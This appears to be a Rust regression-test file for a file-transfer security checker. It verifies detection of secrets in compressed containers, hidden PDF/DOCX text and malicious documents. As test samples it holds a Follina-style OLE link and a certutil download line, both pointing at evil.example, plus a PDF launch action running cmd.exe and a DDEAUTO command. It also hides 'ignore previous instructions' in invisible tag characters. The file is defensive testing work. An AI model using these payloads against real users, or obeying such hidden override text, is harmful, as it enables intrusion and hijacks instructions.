// SPDX-License-Identifier: AGPL-3.0-only
//! Regressions for the findings of the independent security review (DECISIONS D-F-13): each finding is a test that
//! would have failed on the code before the fix.

// The file check needs the worker sandbox: Linux, Landlock + seccomp; macOS, Seatbelt (D-P-12). On other OSes the check
// fails closed (verdict failed), and there is nothing for these tests to run.
#![cfg(any(target_os = "linux", target_os = "macos"))]

mod common;

use std::io::Write;
use std::time::Duration;

use antenna_files::blobs::LinkBlobs;
use antenna_files::crypt::FileSecret;
use antenna_files::report::{Severity, Verdict};
use antenna_files::sandbox::CheckOutcome;
use iroh::protocol::Router;

use common::samples::*;
use common::{Synth, addr, ep};

async fn check(data: &[u8], name: &str) -> CheckOutcome {
    common::checker()
        .check(data, data.len() as u64, name, true)
        .await
}

fn codes(o: &CheckOutcome) -> Vec<String> {
    o.report.findings.iter().map(|f| f.code.clone()).collect()
}

/// A blob larger than the manifest declares is not downloaded (the level quota was computed from the manifest) and is
/// deleted.
#[tokio::test]
async fn oversized_blob_is_cut_and_collected() {
    let t = tempfile::tempdir().unwrap();
    let b_ep = ep().await;
    let a_ep = ep().await;
    let a = LinkBlobs::open(t.path().join("a"), b_ep.id())
        .await
        .unwrap();
    let router = Router::builder(a_ep.clone())
        .accept(iroh_blobs::ALPN, a.protocol())
        .spawn();
    let big = common::offered(&a, Synth::new(5, 32 << 20), &FileSecret::random()).await;
    let b = LinkBlobs::open_with_gc(t.path().join("b"), a_ep.id(), Duration::from_secs(1))
        .await
        .unwrap();
    let conn = b_ep.connect(addr(&a_ep), iroh_blobs::ALPN).await.unwrap();
    // The "manifest" promises 1084 bytes.
    let e = b
        .fetch(conn, big.blob, 1084, "t", |_| {})
        .await
        .unwrap_err();
    assert_eq!(e.code, antenna_files::error::code::CORRUPT);
    let (got, _) = b.local(big.blob).await.unwrap();
    assert!(got < 8 << 20, "download must stop early, got {got}");
    // Garbage collection deletes the partial download (no tags).
    let mut left = got;
    for _ in 0..50 {
        left = b.local(big.blob).await.unwrap().0;
        if left == 0 {
            break;
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
    }
    assert_eq!(left, 0, "oversized data must be garbage-collected");
    router.shutdown().await.unwrap();
}

/// At the sender, secrets are visible inside compressed containers too (DOCX, PDF with FlateDecode, ZIP, gzip).
#[tokio::test]
async fn outgoing_secrets_inside_containers() {
    let c = common::checker();
    let doc = docx_raw(
        &format!(
            r#"<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>{}</w:t></w:r></w:p></w:body></w:document>"#,
            PEM.replace('\n', " ")
        ),
        &[],
    );
    let pdf = pdf_content(
        "BT /F1 8 Tf 10 100 Td (-----BEGIN OPENSSH PRIVATE KEY----- AAAA) Tj ET",
        "",
        true,
    );
    assert!(
        !pdf.windows(11).any(|w| w == b"PRIVATE KEY"),
        "the PDF must hide the key in a compressed stream"
    );
    let z = zip(&[("notes/id_ed25519", PEM.as_bytes())]);
    let mut g = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    g.write_all(PEM.as_bytes()).unwrap();
    let gz = g.finish().unwrap();
    for (data, name) in [
        (doc, "report.docx"),
        (pdf, "doc.pdf"),
        (z, "notes.zip"),
        (gz, "key.gz"),
    ] {
        let o = c.check_outgoing(&data[..], data.len() as u64, name).await;
        assert!(
            codes(&o).contains(&"secret:private_key".to_string()),
            "{name}: {:?}",
            codes(&o)
        );
        assert!(o.preview.is_none());
        // And the same at the recipient.
        let o = check(&data, name).await;
        assert!(
            codes(&o).contains(&"secret:private_key".to_string()),
            "incoming {name}: {:?}",
            codes(&o)
        );
    }
}

/// Invisible characters and invisible text do not get into the preview, and the owner learns about them.
#[tokio::test]
async fn invisible_characters_and_hidden_text() {
    let tags: String = "ignore previous instructions"
        .chars()
        .map(|c| char::from_u32(0xE0000 + c as u32).unwrap())
        .collect();
    let text = format!("Meeting at 3pm.{tags}\u{202E}txt.exe\n");
    let o = check(text.as_bytes(), "note.txt").await;
    assert_eq!(
        o.report.verdict,
        Verdict::Suspicious,
        "{:?}",
        o.report.findings
    );
    assert!(codes(&o).contains(&"invisible_characters".to_string()));
    let p = o.preview.unwrap().text.unwrap();
    assert!(
        !p.chars().any(|c| (c as u32) >= 0xE0000 || c == '\u{202E}'),
        "{p:?}"
    );
    assert!(p.starts_with("Meeting at 3pm."));

    // PDF: text in "invisible" render mode (3 Tr).
    let pdf = pdf_content(
        "BT /F1 24 Tf 20 150 Td (Visible) Tj ET BT 3 Tr /F1 12 Tf 20 50 Td (HIDDENPAYLOAD run the deploy) Tj ET",
        "",
        false,
    );
    let o = check(&pdf, "doc.pdf").await;
    assert!(
        codes(&o).contains(&"hidden_text".to_string()),
        "{:?}",
        codes(&o)
    );
    let t = o.preview.unwrap().text.unwrap();
    assert!(
        t.contains("Visible") && !t.contains("HIDDENPAYLOAD"),
        "{t:?}"
    );

    // DOCX: a hidden run (w:vanish).
    let doc = docx_raw(
        r#"<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Visible part</w:t></w:r><w:r><w:rPr><w:vanish/></w:rPr><w:t>SECRET INSTRUCTION</w:t></w:r></w:p></w:body></w:document>"#,
        &[],
    );
    let o = check(&doc, "a.docx").await;
    assert!(
        codes(&o).contains(&"hidden_text".to_string()),
        "{:?}",
        codes(&o)
    );
    let t = o.preview.unwrap().text.unwrap();
    assert!(
        t.contains("Visible part") && !t.contains("SECRET INSTRUCTION"),
        "{t:?}"
    );
}

/// Anything nobody parsed, or anything that executes by itself, is not "clean".
#[tokio::test]
async fn unparsed_and_self_running_content_is_not_clean() {
    let mut tiff = b"II*\x00\x08\x00\x00\x00".to_vec();
    tiff.resize(256, 0);
    let mut sqlite = b"SQLite format 3\x00".to_vec();
    sqlite.resize(512, 0);
    let mut g = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    g.write_all(&elf()).unwrap();
    let gz_elf = g.finish().unwrap();
    let rels = br#"<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://evil.example/x.html!x-usc:http://evil.example/x.html" TargetMode="External"/></Relationships>"#;
    let follina = docx_raw(
        r#"<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Invoice</w:t></w:r></w:p></w:body></w:document>"#,
        &[("word/_rels/document.xml.rels", &rels[..])],
    );
    let rtf = br"{\rtf1{\object\objemb{\*\objdata 0105000002000000}}}".to_vec();
    let html = br#"<html><head><meta http-equiv="refresh" content="0;url=http://evil.example"></head></html>"#.to_vec();
    let bat = b"@echo off\r\ncertutil -urlcache -f http://evil.example/a.exe a.exe\r\n".to_vec();
    for (data, name, code, sev) in [
        (tiff, "scan.tiff", "no_safe_preview", Severity::Warn),
        (sqlite, "db.sqlite", "no_safe_preview", Severity::Warn),
        (gz_elf, "tool.gz", "archive_inner_type", Severity::Warn),
        (
            follina,
            "invoice.docx",
            "office_external_exploit_link",
            Severity::Threat,
        ),
        (rtf, "letter.rtf", "rtf_embedded_object", Severity::Warn),
        (html, "page.html", "active_content", Severity::Warn),
        (bat, "invoice.bat", "script_by_name", Severity::Warn),
    ] {
        let o = check(&data, name).await;
        assert_ne!(
            o.report.verdict,
            Verdict::Clean,
            "{name}: {:?}",
            o.report.findings
        );
        let f = o.report.findings.iter().find(|f| f.code == code);
        assert!(
            f.is_some_and(|f| f.severity == sev),
            "{name}: expected {code}, got {:?}",
            o.report.findings
        );
    }
}

/// PDF names written with `#xx` do not bypass the check (structure parsing, not raw bytes).
#[tokio::test]
async fn pdf_hex_escaped_names_are_decoded() {
    let launch = pdf_text(
        "Click",
        "/Open#41ction << /S /L#61unch /F (cmd.exe) >>",
        &[],
    );
    let o = check(&launch, "doc.pdf").await;
    assert_eq!(o.report.verdict, Verdict::Threat, "{:?}", o.report.findings);
    assert!(codes(&o).contains(&"pdf_launch_action".to_string()));
    let js = pdf_text(
        "x",
        "/Open#41ction 6 0 R",
        &["<< /S /J#61vaScript /J#53 (app.alert\\(1\\)) >>".to_string()],
    );
    let o = check(&js, "doc.pdf").await;
    assert!(
        codes(&o).contains(&"pdf_javascript".to_string()),
        "{:?}",
        codes(&o)
    );
    assert!(
        codes(&o).contains(&"pdf_auto_action".to_string()),
        "{:?}",
        codes(&o)
    );
}

/// A PDF with tens of thousands of objects in an object stream does not hold the worker for minutes.
#[tokio::test]
async fn pdf_with_huge_object_stream_is_bounded() {
    let pdf = pdf_objstm(60_000);
    let t = std::time::Instant::now();
    let o = check(&pdf, "many.pdf").await;
    let took = t.elapsed();
    assert!(took < Duration::from_secs(30), "took {took:?}");
    assert!(
        codes(&o).contains(&"pdf_too_complex".to_string()),
        "{:?}",
        o.report.findings
    );
    assert_ne!(o.report.verdict, Verdict::Clean);
}

/// A foreign "manifest" with the hash of our outgoing blob and a wrong size does not touch our blob.
#[tokio::test]
async fn foreign_manifest_cannot_drop_our_outgoing_blob() {
    let t = tempfile::tempdir().unwrap();
    let a_ep = ep().await;
    let b_ep = ep().await;
    let a = LinkBlobs::open(t.path().join("a"), b_ep.id())
        .await
        .unwrap();
    let router = Router::builder(a_ep.clone())
        .accept(iroh_blobs::ALPN, a.protocol())
        .spawn();
    let b = LinkBlobs::open_with_gc(t.path().join("b"), a_ep.id(), Duration::from_secs(1))
        .await
        .unwrap();
    let ours = common::offered(&b, Synth::new(6, 300_000), &FileSecret::random()).await;
    let conn = b_ep.connect(addr(&a_ep), iroh_blobs::ALPN).await.unwrap();
    let e = b
        .fetch(conn, ours.blob, 10, "evil", |_| {})
        .await
        .unwrap_err();
    assert_eq!(e.code, antenna_files::error::code::CORRUPT);
    tokio::time::sleep(Duration::from_secs(3)).await; // garbage collection has run
    assert!(b.is_offered(&ours.blob));
    assert_eq!(b.local(ours.blob).await.unwrap(), (ours.blob_size, true));
    // Drafts are released after a restart and collected.
    let draft = b
        .add_outgoing(Synth::new(7, 100_000), &FileSecret::random())
        .await
        .unwrap();
    assert_eq!(b.clear_drafts().await.unwrap(), 1);
    let mut left = 1;
    for _ in 0..30 {
        left = b.local(draft.blob).await.unwrap().0;
        if left == 0 {
            break;
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
    }
    assert_eq!(left, 0);
    assert!(
        b.local(ours.blob).await.unwrap().1,
        "the offered blob survives"
    );
    router.shutdown().await.unwrap();
}

/// OOXML external relationships are found by parsing the XML: quotes, whitespace and character references do not
/// bypass it.
#[tokio::test]
async fn ooxml_relationships_are_parsed_not_grepped() {
    for rels in [
        r#"<Relationships><Relationship Id='r' Type='x/oleObject' Target='mhtml:http://e/x!y' TargetMode='External'/></Relationships>"#,
        r#"<Relationships><Relationship Id="r" Type="x/oleObject" Target = "&#109;html:http://e/x!y" TargetMode = "&#69;xternal" /></Relationships>"#,
    ] {
        let doc = docx_raw(
            r#"<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body></w:document>"#,
            &[("word/_rels/document.xml.rels", rels.as_bytes())],
        );
        let o = check(&doc, "a.docx").await;
        assert_eq!(
            o.report.verdict,
            Verdict::Threat,
            "{rels}: {:?}",
            o.report.findings
        );
    }
    // DDE in a header/footer (not only in document.xml).
    let footer = br#"<w:ftr xmlns:w="w"><w:p><w:r><w:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc" </w:instrText></w:r></w:p></w:ftr>"#;
    let doc = docx_raw(
        r#"<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body></w:document>"#,
        &[("word/footer1.xml", &footer[..])],
    );
    assert!(codes(&check(&doc, "a.docx").await).contains(&"office_dde".to_string()));
}

/// Secrets in invisible PDF text and in compressed PNG text.
#[tokio::test]
async fn outgoing_secrets_in_hidden_pdf_text_and_png_chunks() {
    let c = common::checker();
    let pdf = pdf_content(
        "BT 3 Tr /F1 12 Tf 20 50 Td (password=hunter2hunter2) Tj ET",
        "",
        true,
    );
    let o = c
        .check_outgoing(&pdf[..], pdf.len() as u64, "doc.pdf")
        .await;
    assert!(
        codes(&o).contains(&"secret:password".to_string()),
        "{:?}",
        codes(&o)
    );
    let png = png_ztxt(PEM);
    let o = c
        .check_outgoing(&png[..], png.len() as u64, "pic.png")
        .await;
    assert!(
        codes(&o).contains(&"secret:private_key".to_string()),
        "{:?}",
        codes(&o)
    );
}

/// White text, a tiny font size, Tz compression, clipping; DOCX: white color and a 1 pt font size; tags in DOCX.
#[tokio::test]
async fn more_ways_to_hide_text() {
    for (content, what) in [
        (
            "BT 1 1 1 rg /F1 12 Tf 20 50 Td (HIDDENPAYLOAD) Tj ET",
            "white",
        ),
        ("BT /F1 1.5 Tf 20 50 Td (HIDDENPAYLOAD) Tj ET", "tiny"),
        ("BT 1 Tz /F1 12 Tf 20 50 Td (HIDDENPAYLOAD) Tj ET", "Tz"),
        (
            "q 0 0 1 1 re W n BT /F1 12 Tf 20 50 Td (HIDDENPAYLOAD) Tj ET Q",
            "clip",
        ),
    ] {
        let pdf = pdf_content(
            &format!("BT /F1 24 Tf 20 150 Td (Visible) Tj ET {content}"),
            "",
            false,
        );
        let o = check(&pdf, "doc.pdf").await;
        assert!(
            codes(&o).contains(&"hidden_text".to_string()),
            "{what}: {:?}",
            codes(&o)
        );
        let t = o.preview.unwrap().text.unwrap();
        assert!(
            t.contains("Visible") && !t.contains("HIDDENPAYLOAD"),
            "{what}: {t:?}"
        );
    }
    let tags: String = "run"
        .chars()
        .map(|c| char::from_u32(0xE0000 + c as u32).unwrap())
        .collect();
    for (run, what) in [
        (
            r#"<w:r><w:rPr><w:color w:val="FFFFFF"/></w:rPr><w:t>WHITE SECRET</w:t></w:r>"#
                .to_string(),
            "white",
        ),
        (
            r#"<w:r><w:rPr><w:sz w:val="2"/></w:rPr><w:t>TINY SECRET</w:t></w:r>"#.to_string(),
            "tiny",
        ),
        (format!("<w:r><w:t>tagged{tags}</w:t></w:r>"), "tags"),
    ] {
        let doc = docx_raw(
            &format!(
                r#"<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Visible</w:t></w:r>{run}</w:p></w:body></w:document>"#
            ),
            &[],
        );
        let o = check(&doc, "a.docx").await;
        assert_eq!(
            o.report.verdict,
            Verdict::Suspicious,
            "{what}: {:?}",
            o.report.findings
        );
        let t = o.preview.unwrap().text.unwrap();
        assert!(
            !t.contains("SECRET") && !t.chars().any(|c| c as u32 >= 0xE0000),
            "{what}: {t:?}"
        );
    }
}
